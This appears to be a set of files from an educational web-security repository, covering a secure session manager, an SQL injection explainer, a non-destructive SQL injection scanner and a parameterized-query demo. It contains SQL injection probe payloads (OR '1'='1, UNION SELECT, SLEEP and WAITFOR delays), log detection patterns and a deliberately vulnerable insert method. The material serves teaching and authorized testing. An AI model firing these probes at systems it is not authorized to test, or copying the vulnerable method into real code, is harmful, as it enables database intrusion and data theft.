#!/usr/bin/env python3
"""
Secure server-side session manager
Location: 02-web-application-security/session-hijacking/prevention/secure_session.py

Defences against session hijacking and fixation, in one small class:

  * 256-bit random session ids from the OS CSPRNG (`secrets`), never guessable
  * only a SHA-256 hash of each id is stored, so a leaked session table cannot be replayed
  * a NEW id is issued at login (`rotate`), which defeats session fixation
  * idle timeout and absolute timeout
  * the session is tied to a hash of the User-Agent (and optionally the client IP network)
  * logout and "log out everywhere" really destroy the server-side session
  * cookie attributes are generated for you: __Host- prefix, Secure, HttpOnly, SameSite

This is an in-memory teaching version; production code should keep the same logic in Redis or a
database, and always serve over HTTPS.
"""

import hashlib
import secrets
import time

COOKIE_NAME = "__Host-session"          # __Host- forces Secure, Path=/ and no Domain attribute


def _hash(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


class SessionManager:
    def __init__(self, idle_timeout=900, absolute_timeout=28800, bind_ip_prefix=False):
        self.idle_timeout = idle_timeout
        self.absolute_timeout = absolute_timeout
        self.bind_ip_prefix = bind_ip_prefix
        self._sessions = {}                 # sha256(session id) -> record

    @staticmethod
    def _ip_prefix(ip):
        return ".".join(ip.split(".")[:3]) if "." in ip else ip.rsplit(":", 4)[0]

    def create(self, user_id, user_agent, ip, now=None):
        session_id = secrets.token_urlsafe(32)
        now = now if now is not None else time.time()
        self._sessions[_hash(session_id)] = {
            "user": user_id, "created": now, "last_seen": now,
            "ua": _hash(user_agent), "net": self._ip_prefix(ip),
        }
        return session_id

    def validate(self, session_id, user_agent, ip, now=None):
        """Return the user id, or None if the session is unknown, expired or looks stolen."""
        key = _hash(session_id or "")
        record = self._sessions.get(key)
        if record is None:
            return None
        now = now if now is not None else time.time()
        expired = now - record["last_seen"] > self.idle_timeout or now - record["created"] > self.absolute_timeout
        stolen = record["ua"] != _hash(user_agent) or (self.bind_ip_prefix and record["net"] != self._ip_prefix(ip))
        if expired or stolen:
            del self._sessions[key]          # fail closed: destroy it
            return None
        record["last_seen"] = now
        return record["user"]

    def rotate(self, old_session_id, user_agent, ip, now=None):
        """Call after login or privilege change: returns a fresh id and destroys the old one."""
        record = self._sessions.pop(_hash(old_session_id or ""), None)
        user = record["user"] if record else None
        return self.create(user, user_agent, ip, now) if user is not None else None

    def destroy(self, session_id):
        self._sessions.pop(_hash(session_id or ""), None)

    def destroy_all(self, user_id):
        for key in [k for k, v in self._sessions.items() if v["user"] == user_id]:
            del self._sessions[key]

    def cookie_header(self, session_id):
        return (f"{COOKIE_NAME}={session_id}; Path=/; Secure; HttpOnly; SameSite=Lax; "
                f"Max-Age={self.absolute_timeout}")


if __name__ == "__main__":
    manager = SessionManager(idle_timeout=900)
    sid = manager.create("alice", "Mozilla/5.0", "203.0.113.7", now=0)
    print("valid session            :", manager.validate(sid, "Mozilla/5.0", "203.0.113.7", now=60))
    print("different browser (theft):", manager.validate(sid, "curl/8.0", "203.0.113.7", now=61))
    sid = manager.create("alice", "Mozilla/5.0", "203.0.113.7", now=0)
    new_sid = manager.rotate(sid, "Mozilla/5.0", "203.0.113.7", now=10)
    print("old id after rotation    :", manager.validate(sid, "Mozilla/5.0", "203.0.113.7", now=11))
    print("new id works             :", manager.validate(new_sid, "Mozilla/5.0", "203.0.113.7", now=12))
    print("after idle timeout       :", manager.validate(new_sid, "Mozilla/5.0", "203.0.113.7", now=12 + 1000))
    print("cookie                   :", manager.cookie_header("<id>"))

topics.title: SQL Injection
topics.summary: SQL injection happens when an application builds a database query by pasting user input into SQL text. The database cannot tell which part the developer wrote and which part the attacker supplied, so the attacker can change what the query does.

mapping.value: Initial Access / T1190 Exploit Public-Facing Application
CWE-89 Improper Neutralization of Special Elements used in an SQL Command

topics.html:
Last reviewed: 2026-10-10 | Status: Reviewed

Standards mapping

FrameworkReference
OWASP Top 10:2025A05:2025 - Injection
MITRE ATT&CK (v19)Initial Access / T1190 Exploit Public-Facing Application
CWECWE-89 Improper Neutralization of Special Elements used in an SQL Command
CAPECCAPEC-66 SQL Injection
Example CVECVE-2023-34362 (MOVEit Transfer)

What it is

SQL injection happens when an application builds a database query by pasting user input into SQL text. The database cannot tell which part the developer wrote and which part the attacker supplied, so the attacker can change what the query does. Depending on the database and its permissions, that can mean reading data they should not see, changing or deleting records, bypassing logins, or in some setups running commands on the database server.

How it works

flowchart LR
    A[Attacker input] --> B[Web application]
    B --> C["Query built by string concatenation"]
    C --> D[Database]
    D --> E[Data exposed or changed]

The three families differ in how the attacker gets results back:

  • In-band: results appear in the response. Error-based attacks read data out of error messages; UNION-based attacks append their own result set to the original query.
  • Blind (inferential): nothing useful is returned, so the attacker asks yes/no questions. Boolean-based attacks watch for differences in the page; time-based attacks watch for delays.
  • Out-of-band: the database is made to contact an attacker-controlled server (DNS or HTTP) to carry data out. This depends on database features that are often disabled.

A fourth case is easy to miss: second-order injection. The attacker's input is stored safely, then later pasted into a query by a different part of the application.

Real-world example

Starting May 27, 2023, the Cl0p ransomware group exploited a previously unknown SQL injection flaw in Progress Software's MOVEit Transfer file-transfer product (CVE-2023-34362). Attackers installed a web shell called LEMURLOOT on internet-facing servers and used it to steal data from the underlying databases. CISA and the FBI published a joint advisory on June 7, 2023.

Source: CISA and FBI advisory

Detection

In web and application logs

  • Request parameters containing quote characters followed by SQL comment sequences (--, #, /*)
  • Keywords that do not belong in a normal value: UNION SELECT, information_schema, SLEEP(, WAITFOR DELAY, pg_sleep(
  • Repeated HTTP 500 responses from a single endpoint, or database error text appearing in responses
  • Requests that consistently take a fixed number of seconds longer than normal (time-based probing)

In the database

  • Queries with an unusual shape for that application, or queries against system catalogs
  • Unexpectedly large result sets from a normal application account

Automated checks

  • Static analysis in CI (for example Semgrep or CodeQL) to flag string-built queries before they ship
  • Dynamic scanning against a test environment (OWASP ZAP, Burp Suite)

Scripts in this repository

  • sql_injection_detector.py: the fuller scanner, with threading, cookies, proxy support and JSON output
  • sql_injection_scanner.py: a smaller, simpler scanner

Pattern recognition for log review:

PatternWhat the attacker is tryingWhat it looks like in a log
' OR '1'='1Make a condition always trueQuote plus OR plus a self-evident true comparison
UNION SELECTAppend their own result setUNION in a parameter that should hold a name or number
SLEEP(5), WAITFOR DELAY, pg_sleep(5)Infer data from response timeDelay functions in input, responses about 5 seconds slow

Prevention

In order of strength. The first item fixes the cause; the rest reduce risk.

  1. Parameterized queries (prepared statements). Send the SQL text and the values separately, so input can never be read as SQL. This is the primary defense.
  2. Stored procedures, only if they contain no dynamic SQL. A procedure that builds its own query by concatenation is just as vulnerable.
  3. Allow-list validation for anything you cannot parameterize. Table names, column names and sort direction cannot be bound as parameters. Map the user's choice to a fixed set of values you control.
  4. Least privilege. The application's database account should not own the schema, read system tables, or run administrative commands. This limits what a successful injection can do.
  5. Safe error handling. Log database errors on the server and show users a generic message. Detailed errors hand attackers a map.
  6. A web application firewall as a stopgap. It can buy time while a fix ships, but it can be bypassed and is not a substitute for items 1 to 3.

Escaping user input yourself is a last resort for legacy code. It is easy to get wrong, and it is not a replacement for parameterization.

Reference: OWASP SQL Injection Prevention Cheat Sheet

Code examples

Placeholder syntax depends on the database driver:

DriverPlaceholder
sqlite3?
psycopg2 (PostgreSQL)%s
mysql-connector-python%s
# Vulnerable: input becomes part of the SQL text
cursor.execute(f"SELECT * FROM users WHERE email = '{user_email}'")

# Safe (sqlite3): the value travels separately
cursor.execute("SELECT * FROM users WHERE email = ?", (user_email,))

# Safe (psycopg2 or mysql-connector)
cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))

Identifiers cannot be parameterized, so use an allow-list:

ALLOWED_SORT_COLUMNS = {"name": "username", "created": "created_at"}

sort_column = ALLOWED_SORT_COLUMNS.get(requested_sort, "username")
cursor.execute(f"SELECT id, username FROM users ORDER BY {sort_column}")

Here the f-string is safe only because sort_column always comes from the dictionary, never from the user.

Run the full working example (SQLite, Python 3.10+):

cd prevention/
python parameterized_queries.py
  • parameterized_queries.py: secure create, read, search, update and delete, with salted password hashing
  • input_validation.py: input validation helpers

Common mistakes

  • Parameterizing the values but concatenating the column or table name
  • Using an ORM's raw-query feature (such as SQLAlchemy text(), Django .raw() or .extra()) with string formatting
  • Relying on input validation or quote escaping alone
  • Trusting data because it came from your own database (second-order injection)
  • Showing raw database errors to users
  • Treating a WAF as the fix

Test it safely

Only test applications you own or have written permission to test. Unauthorized testing is illegal.

Practice targets built to be attacked:

  • OWASP Juice Shop
  • DVWA
  • OWASP WebGoat

Tools: sqlmap, OWASP ZAP, Burp Suite

References

  • OWASP Top 10:2025
  • OWASP SQL Injection
  • MITRE ATT&CK T1190
  • CWE-89
  • PortSwigger Web Security Academy: SQL injection

#!/usr/bin/env python3
"""
SQL Injection Detector
Location: 02-web-application-security/sql-injection/detection/sql_injection_detector.py

Tests the parameters of a web application you own (or have written permission
to test) for SQL injection, using three techniques:

  * error-based    - the injected input makes the database leak an error
  * boolean-based  - a TRUE condition and a FALSE condition give different pages
  * time-based     - an injected delay function makes the response slow

All probes are NON-DESTRUCTIVE: nothing in the payload list writes, changes or
deletes data. (Earlier versions sent DROP TABLE / INSERT / INTO OUTFILE payloads,
which could damage a vulnerable target.)

Exit codes: 0 = no finding, 1 = vulnerability found, 2 = scan could not complete.
"""

import argparse
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

import requests
from colorama import Fore, Style, init

init(autoreset=True)

SLEEP_SECONDS = 5
TIME_THRESHOLD = SLEEP_SECONDS - 0.5      # a delayed response must take at least this long
MAX_BASELINE_SECONDS = 2.0                # skip time-based tests if the page is already slow

# Probes that provoke a database error. Appended to the original parameter value.
ERROR_PAYLOADS = ["'", '"', "')", "\\", "' OR '1'='1", '" OR "1"="1', "' UNION SELECT NULL--", "1 AND 1=1"]

# (TRUE condition, FALSE condition) pairs for boolean-based detection.
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
]

# (label, payload) delay probes for time-based detection.
TIME_PAYLOADS = [
    ("MySQL", "' OR SLEEP(5)-- -"),
    ("MySQL (numeric)", " OR SLEEP(5)-- -"),
    ("PostgreSQL", "'; SELECT pg_sleep(5)--"),
    ("SQL Server", "'; WAITFOR DELAY '0:0:5'--"),
]

ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB) server",
        r"You have an error in your SQL syntax", r"Unknown column '[^']+' in 'where clause'",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result", r"PG::SyntaxError",
        r"ERROR:\s+syntax error at or near", r"ERROR:\s+operator does not exist",
        r"unterminated quoted string at or near",
    ],
    "Oracle": [r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver", r"quoted string not properly terminated"],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"valid SQLite", r"unrecognized token", r"sqlite3\.OperationalError",
        r"SQLITE_ERROR", r"near \"[^\"]*\": syntax error",
    ],
    "SQL Server": [
        r"SQL Server.*Driver", r"Driver.*SQL Server", r"SQLServer JDBC Driver", r"com\.microsoft\.sqlserver",
        r"Unclosed quotation mark", r"Microsoft OLE DB Provider for ODBC Drivers", r"Incorrect syntax near",
    ],
    "General": [
        r"SQL syntax", r"mysql_fetch", r"mysqli_error", r"PDOException", r"\[SQL Server\]",
        r"Dynamic SQL Error", r"SQLSTATE\[",
    ],
}
_COMPILED = {db: [re.compile(p, re.IGNORECASE) for p in pats] for db, pats in ERROR_PATTERNS.items()}


class SQLInjectionDetector:
    def __init__(self, target_url, method="GET", threads=5, timeout=10,
                 cookie=None, proxy=None, data=None):
        scheme = urlsplit(target_url).scheme
        if scheme not in ("http", "https"):
            raise ValueError("Target URL must start with http:// or https://")

        self.target_url = target_url
        self.method = method.upper()
        self.threads = max(1, threads)
        self.timeout = timeout
        self.body_pairs = parse_qsl(data, keep_blank_values=True) if data else []

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner - Educational Purpose)"})
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        if proxy:
            self.session.proxies.update({"http": proxy, "https": proxy})

        self.results = {
            "target": target_url,
            "method": self.method,
            "timestamp": datetime.now().isoformat(),
            "scan_completed": False,
            "error": None,
            "vulnerable": False,
            "database_type": None,
            "vulnerabilities": [],
            "summary": {"total_parameters_tested": 0, "total_vulnerabilities_found": 0,
                        "vulnerable_parameters": [], "database_types": []},
        }

    # ------------------------------------------------------------------ requests
    def extract_parameters(self):
        """Return [(name, value)] for the query string (GET) or --data body (POST)."""
        if self.method == "POST":
            return list(self.body_pairs)
        return parse_qsl(urlsplit(self.target_url).query, keep_blank_values=True)

    def send(self, param, value):
        """Send the request with `param` set to `value`. Returns (response, seconds) or (None, seconds)."""
        pairs = [(k, value if k == param else v) for k, v in self.extract_parameters()]
        start = time.monotonic()
        try:
            if self.method == "POST":
                response = self.session.post(self.target_url, data=pairs, timeout=self.timeout)
            else:
                parts = urlsplit(self.target_url)
                url = urlunsplit(parts._replace(query=urlencode(pairs, quote_via=quote)))
                response = self.session.get(url, timeout=self.timeout)
        except requests.exceptions.RequestException:
            return None, time.monotonic() - start
        return response, time.monotonic() - start

    @staticmethod
    def match_error(text):
        for db, patterns in _COMPILED.items():
            for pattern in patterns:
                if pattern.search(text):
                    return db, pattern.pattern
        return None, None

    # ------------------------------------------------------------------ testing
    def test_parameter(self, param, original):
        """Test one parameter. Returns a list of findings."""
        print(f"\n{Fore.CYAN}[*] Testing parameter: {param} ({self.method}){Style.RESET_ALL}")
        findings = []

        baseline, baseline_time = self.send(param, original)
        if baseline is None:                     # never use `if not response`: it is False for HTTP 4xx/5xx
            print(f"{Fore.YELLOW}  [!] No response for the baseline request, skipping{Style.RESET_ALL}")
            return findings
        baseline_db, _ = self.match_error(baseline.text)

        # 1. Error-based. HTTP 500 pages are exactly where database errors appear, so they are analysed.
        for payload in ERROR_PAYLOADS:
            response, elapsed = self.send(param, original + payload)
            if response is None:
                continue
            db, pattern = self.match_error(response.text)
            if db and db != baseline_db:         # ignore pages that always contain error-like text
                findings.append({"parameter": param, "technique": "error-based", "payload": payload,
                                 "database": db, "evidence": pattern, "confidence": "HIGH",
                                 "response_code": response.status_code, "response_time": round(elapsed, 2)})
                print(f"{Fore.RED}  [!] Error-based SQL injection ({db}) with payload: {payload}{Style.RESET_ALL}")
                break

        # 2. Boolean-based. Only meaningful if the page is stable between identical requests.
        again, _ = self.send(param, original)
        if again is not None and again.text == baseline.text:
            for true_cond, false_cond in BOOLEAN_PAIRS:
                r_true, _ = self.send(param, original + true_cond)
                r_false, _ = self.send(param, original + false_cond)
                if r_true is None or r_false is None:
                    continue
                if r_true.text == baseline.text and r_false.text != r_true.text:
                    findings.append({"parameter": param, "technique": "boolean-based",
                                     "payload": f"{true_cond}  vs  {false_cond}", "database": "Unknown",
                                     "evidence": "TRUE condition matches the normal page, FALSE condition differs",
                                     "confidence": "MEDIUM", "response_code": r_true.status_code,
                                     "response_time": 0})
                    print(f"{Fore.RED}  [!] Boolean-based SQL injection with: {true_cond}{Style.RESET_ALL}")
                    break
        else:
            print(f"{Fore.YELLOW}  [i] Page content changes between identical requests; boolean test skipped{Style.RESET_ALL}")

        # 3. Time-based. Each hit is repeated once to rule out a slow server.
        if baseline_time < MAX_BASELINE_SECONDS:
            for label, payload in TIME_PAYLOADS:
                response, elapsed = self.send(param, original + payload)
                if response is None or elapsed < TIME_THRESHOLD:
                    continue
                _, repeat = self.send(param, original + payload)
                if repeat >= TIME_THRESHOLD:
                    findings.append({"parameter": param, "technique": "time-based", "payload": payload,
                                     "database": label, "evidence": f"responses took {elapsed:.1f}s and {repeat:.1f}s",
                                     "confidence": "HIGH", "response_code": response.status_code,
                                     "response_time": round(elapsed, 2)})
                    print(f"{Fore.RED}  [!] Time-based SQL injection ({label}) with payload: {payload}{Style.RESET_ALL}")
                    break
        return findings

    # ------------------------------------------------------------------ scan flow
    def scan(self):
        print(f"\n{Fore.CYAN}[*] Target: {self.target_url}  Method: {self.method}  Threads: {self.threads}{Style.RESET_ALL}")

        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[+] Target is reachable (HTTP {response.status_code}){Style.RESET_ALL}")
        except requests.exceptions.RequestException as exc:
            self.results["error"] = f"Target unreachable: {exc}"
            print(f"{Fore.RED}[x] {self.results['error']}{Style.RESET_ALL}")
            return self.results

        parameters = self.extract_parameters()
        if not parameters:
            self.results["error"] = ("No parameters to test. For GET put them in the URL (?id=1); "
                                     "for POST pass --data 'a=1&b=2'.")
            print(f"{Fore.YELLOW}[!] {self.results['error']}{Style.RESET_ALL}")
            return self.results

        print(f"[*] Found {len(parameters)} parameter(s): {', '.join(n for n, _ in parameters)}")
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            batches = list(pool.map(lambda p: self.test_parameter(p[0], p[1]), parameters))

        vulnerabilities = [finding for batch in batches for finding in batch]
        self.results["vulnerabilities"] = vulnerabilities
        self.results["vulnerable"] = bool(vulnerabilities)
        known_dbs = [v["database"] for v in vulnerabilities if v["database"] not in ("Unknown", "General")]
        self.results["database_type"] = known_dbs[0] if known_dbs else None
        self.results["summary"] = {
            "total_parameters_tested": len(parameters),
            "total_vulnerabilities_found": len(vulnerabilities),
            "vulnerable_parameters": sorted({v["parameter"] for v in vulnerabilities}),
            "database_types": sorted({v["database"] for v in vulnerabilities}),
        }
        self.results["scan_completed"] = True
        return self.results

    def print_report(self):
        bar = "=" * 60
        print(f"\n{Fore.CYAN}{bar}\nSCAN REPORT\n{bar}{Style.RESET_ALL}")
        print(f"Target: {self.target_url}\nTimestamp: {self.results['timestamp']}")

        if not self.results["scan_completed"]:
            print(f"\n{Fore.RED}[x] SCAN DID NOT COMPLETE - no conclusion can be drawn.{Style.RESET_ALL}")
            print(f"    Reason: {self.results['error']}")
            return

        if self.results["vulnerable"]:
            print(f"\n{Fore.RED}[!] VULNERABILITIES DETECTED{Style.RESET_ALL}")
            if self.results["database_type"]:
                print(f"    Database type: {self.results['database_type']}")
            for i, vuln in enumerate(self.results["vulnerabilities"], 1):
                print(f"\n  {i}. Parameter: {vuln['parameter']}  [{vuln['technique']}, {vuln['confidence']} confidence]")
                print(f"     Payload:  {vuln['payload']}")
                print(f"     Database: {vuln['database']}")
                print(f"     Evidence: {vuln['evidence']}")
        else:
            print(f"\n{Fore.GREEN}[+] No SQL injection detected in the tested parameters.{Style.RESET_ALL}")
            print("    This does not prove the application is safe: only the probes above were tried.")

        summary = self.results["summary"]
        print(f"\nParameters tested: {summary['total_parameters_tested']}   "
              f"Findings: {summary['total_vulnerabilities_found']}")

    def save_results(self, output_file):
        try:
            with open(output_file, "w") as handle:
                json.dump(self.results, handle, indent=2)
            print(f"{Fore.GREEN}[+] Results saved to {output_file}{Style.RESET_ALL}")
        except OSError as exc:
            print(f"{Fore.RED}[x] Could not save results: {exc}{Style.RESET_ALL}")


def confirm_permission(assume_yes):
    """Ask the operator to confirm authorization. Returns False on 'no' or when stdin is closed."""
    if assume_yes:
        print(f"{Fore.YELLOW}[i] --yes given: you are confirming you may test this target.{Style.RESET_ALL}")
        return True
    try:
        answer = input(f"{Fore.YELLOW}[?] Do you have permission to test this target? (yes/no): {Style.RESET_ALL}")
    except EOFError:
        print(f"\n{Fore.RED}[!] No interactive input available. Re-run with --yes if you are authorized.{Style.RESET_ALL}")
        return False
    return answer.strip().lower() == "yes"


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Vulnerability Scanner (non-destructive)")
    parser.add_argument("-u", "--url", required=True, help="Target URL, e.g. http://localhost:8080/item?id=1")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", help="POST body parameters, e.g. 'user=a&id=1' (with -m POST)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Parameters tested in parallel")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--cookie", help='Session cookie, e.g. "session=abc123"')
    parser.add_argument("--proxy", help="Proxy server, e.g. http://127.0.0.1:8080")
    parser.add_argument("-o", "--output", help="Write results to this JSON file")
    parser.add_argument("--yes", action="store_true", help="Skip the permission prompt (you confirm you are authorized)")
    args = parser.parse_args()

    if not confirm_permission(args.yes):
        print(f"{Fore.RED}[!] Exiting. Only test systems you own or have written permission to test.{Style.RESET_ALL}")
        return 2

    try:
        scanner = SQLInjectionDetector(args.url, args.method, args.threads, args.timeout,
                                       args.cookie, args.proxy, args.data)
    except ValueError as exc:
        print(f"{Fore.RED}[x] {exc}{Style.RESET_ALL}")
        return 2

    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted{Style.RESET_ALL}")
        return 2

    scanner.print_report()
    if args.output:
        scanner.save_results(args.output)

    if not scanner.results["scan_completed"]:
        return 2
    return 1 if scanner.results["vulnerable"] else 0


if __name__ == "__main__":
    sys.exit(main())

Exit codes: 0 = no finding, 1 = vulnerability found, 2 = scan could not complete.

#!/usr/bin/env python3
"""
SQL Injection Prevention - Parameterized Queries
Location: 02-web-application-security/sql-injection/prevention/parameterized_queries.py
"""

import sqlite3
import mysql.connector
from mysql.connector import Error
import psycopg2
from psycopg2 import sql
import hashlib
import os

class SecureDatabaseQueries:
    """
    Example class demonstrating secure database queries using parameterization
    to prevent SQL injection attacks.
    """
    
    def __init__(self, db_type='sqlite', db_name='secure_app.db'):
        self.db_type = db_type
        self.db_name = db_name
        self.connection = None

    @staticmethod
    def hash_password(password):
        """Salted scrypt hash. Plain SHA-256 is too fast to protect passwords."""
        salt = os.urandom(16)
        digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
        return f"scrypt${salt.hex()}${digest.hex()}"

    def _q(self, query):
        """Translate %s placeholders to ? for SQLite, which does not accept %s."""
        return query.replace('%s', '?') if self.db_type == 'sqlite' else query

    def connect(self):
        """Establish database connection based on type"""
        try:
            if self.db_type == 'sqlite':
                self.connection = sqlite3.connect(self.db_name)
                print("[✓] Connected to SQLite database")
                
            elif self.db_type == 'mysql':
                # Example MySQL connection (update with your credentials)
                self.connection = mysql.connector.connect(
                    host='localhost',
                    database=self.db_name,
                    user='your_user',
                    password='your_password'
                )
                print("[✓] Connected to MySQL database")
                
            elif self.db_type == 'postgresql':
                # Example PostgreSQL connection
                self.connection = psycopg2.connect(
                    host='localhost',
                    database=self.db_name,
                    user='your_user',
                    password='your_password'
                )
                print("[✓] Connected to PostgreSQL database")
                
        except Exception as e:
            print(f"[!] Database connection error: {e}")
            return False
        return True
    
    def create_users_table(self):
        """Create example users table"""
        try:
            cursor = self.connection.cursor()
            
            if self.db_type == 'sqlite':
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT UNIQUE NOT NULL,
                        email TEXT UNIQUE NOT NULL,
                        password_hash TEXT NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
            elif self.db_type == 'mysql':
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        username VARCHAR(50) UNIQUE NOT NULL,
                        email VARCHAR(100) UNIQUE NOT NULL,
                        password_hash VARCHAR(255) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
            elif self.db_type == 'postgresql':
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id SERIAL PRIMARY KEY,
                        username VARCHAR(50) UNIQUE NOT NULL,
                        email VARCHAR(100) UNIQUE NOT NULL,
                        password_hash VARCHAR(255) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
            
            self.connection.commit()
            print("[✓] Users table created successfully")
            
        except Exception as e:
            print(f"[!] Error creating table: {e}")
    
    # SECURE METHODS - Using parameterized queries
    
    def add_user_secure(self, username, email, password):
        """
        SECURE: Add a new user using parameterized query
        This prevents SQL injection by separating SQL logic from data
        """
        try:
            cursor = self.connection.cursor()
            
            # Hash the password (never store plain text passwords!)
            password_hash = self.hash_password(password)
            
            # SECURE: Using parameterized query with placeholders
            if self.db_type in ['sqlite', 'mysql']:
                query = "INSERT INTO users (username, email, password_hash) VALUES (%s, %s, %s)"
                cursor.execute(self._q(query), (username, email, password_hash))
            elif self.db_type == 'postgresql':
                # PostgreSQL uses %s placeholders
                query = "INSERT INTO users (username, email, password_hash) VALUES (%s, %s, %s)"
                cursor.execute(self._q(query), (username, email, password_hash))
            
            self.connection.commit()
            print(f"[✓] User '{username}' added successfully (ID: {cursor.lastrowid if hasattr(cursor, 'lastrowid') else 'N/A'})")
            return True
            
        except Exception as e:
            print(f"[!] Error adding user: {e}")
            self.connection.rollback()
            return False
    
    def get_user_secure(self, username):
        """
        SECURE: Retrieve user by username using parameterized query
        """
        try:
            cursor = self.connection.cursor()
            
            # SECURE: Parameterized query
            if self.db_type in ['sqlite', 'mysql', 'postgresql']:
                query = "SELECT id, username, email, created_at FROM users WHERE username = %s"
                cursor.execute(self._q(query), (username,))
            
            result = cursor.fetchone()
            
            if result:
                print(f"[✓] User found: {result}")
                return result
            else:
                print(f"[!] User '{username}' not found")
                return None
                
        except Exception as e:
            print(f"[!] Error retrieving user: {e}")
            return None
    
    def search_users_secure(self, search_term):
        """
        SECURE: Search users with partial matching using parameterized query
        """
        try:
            cursor = self.connection.cursor()
            
            # SECURE: Use parameter for the search term with LIKE
            # Note: The % wildcards are part of the parameter value, not the SQL
            search_pattern = f"%{search_term}%"
            
            query = "SELECT id, username, email FROM users WHERE username LIKE %s OR email LIKE %s"
            cursor.execute(self._q(query), (search_pattern, search_pattern))
            
            results = cursor.fetchall()
            
            print(f"[✓] Found {len(results)} user(s) matching '{search_term}':")
            for user in results:
                print(f"    - ID: {user[0]}, Username: {user[1]}, Email: {user[2]}")
            
            return results
            
        except Exception as e:
            print(f"[!] Error searching users: {e}")
            return []
    
    def update_email_secure(self, user_id, new_email):
        """
        SECURE: Update user email using parameterized query
        """
        try:
            cursor = self.connection.cursor()
            
            # SECURE: Parameterized query
            query = "UPDATE users SET email = %s WHERE id = %s"
            cursor.execute(self._q(query), (new_email, user_id))
            
            self.connection.commit()
            
            if cursor.rowcount > 0:
                print(f"[✓] Email updated for user ID {user_id}")
                return True
            else:
                print(f"[!] No user found with ID {user_id}")
                return False
                
        except Exception as e:
            print(f"[!] Error updating email: {e}")
            self.connection.rollback()
            return False
    
    def delete_user_secure(self, user_id):
        """
        SECURE: Delete user by ID using parameterized query
        """
        try:
            cursor = self.connection.cursor()
            
            # SECURE: Parameterized query
            query = "DELETE FROM users WHERE id = %s"
            cursor.execute(self._q(query), (user_id,))
            
            self.connection.commit()
            
            if cursor.rowcount > 0:
                print(f"[✓] User ID {user_id} deleted successfully")
                return True
            else:
                print(f"[!] No user found with ID {user_id}")
                return False
                
        except Exception as e:
            print(f"[!] Error deleting user: {e}")
            self.connection.rollback()
            return False
    
    # INSECURE METHODS - For demonstration only (DO NOT USE)
    
    def add_user_insecure(self, username, email, password):
        """
        INSECURE: Adding user with string concatenation (VULNERABLE TO SQL INJECTION)
        THIS IS FOR DEMONSTRATION ONLY - NEVER USE THIS APPROACH
        """
        try:
            cursor = self.connection.cursor()
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            # INSECURE: String concatenation creates SQL injection vulnerability
            query = f"INSERT INTO users (username, email, password_hash) VALUES ('{username}', '{email}', '{password_hash}')"
            
            print(f"[!] INSECURE QUERY: {query}")
            
            cursor.execute(query)
            self.connection.commit()
            print(f"[!] User added using INSECURE method")
            
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def demonstrate_injection_attack(self):
        """
        Demonstrate how SQL injection works (for educational purposes)
        """
        print("\n" + "="*60)
        print("SQL INJECTION DEMONSTRATION")
        print("="*60)
        
        # Example of malicious input
        malicious_username = "admin' OR '1'='1"
        malicious_email = "hacker@example.com"
        malicious_password = "anything"
        
        print("\n[!] Malicious input example:")
        print(f"    Username: {malicious_username}")
        
        print("\n[🔴] INSECURE METHOD (String Concatenation):")
        print("    This would generate a query like:")
        print(f"    SELECT * FROM users WHERE username = '{malicious_username}'")
        print("    Which becomes:")
        print("    SELECT * FROM users WHERE username = 'admin' OR '1'='1'")
        print("    This returns ALL users because '1'='1' is always true!")
        
        print("\n[🟢] SECURE METHOD (Parameterized Query):")
        print("    The query would be:")
        print("    SELECT * FROM users WHERE username = %s")
        print("    With parameter: 'admin' OR '1'='1'")
        print("    The database treats this as a literal string, not part of the SQL logic")
        print("    So it searches for a username that literally contains \"admin' OR '1'='1\"")
        print("    Which likely doesn't exist, making the attack fail")
        
        print("\n" + "="*60)
        print("KEY TAKEAWAYS:")
        print("1. Always use parameterized queries/prepared statements")
        print("2. Never concatenate user input directly into SQL strings")
        print("3. Validate and sanitize all user input")
        print("4. Use least privilege principles for database accounts")
        print("="*60)
    
    def close(self):
        """Close database connection"""
        if self.connection:
            self.connection.close()
            print("[✓] Database connection closed")

def main():
    """Example usage of secure database queries"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   SQL Injection Prevention - Parameterized Queries  ║
    ║                EDUCATIONAL EXAMPLE                  ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    # Initialize secure database handler
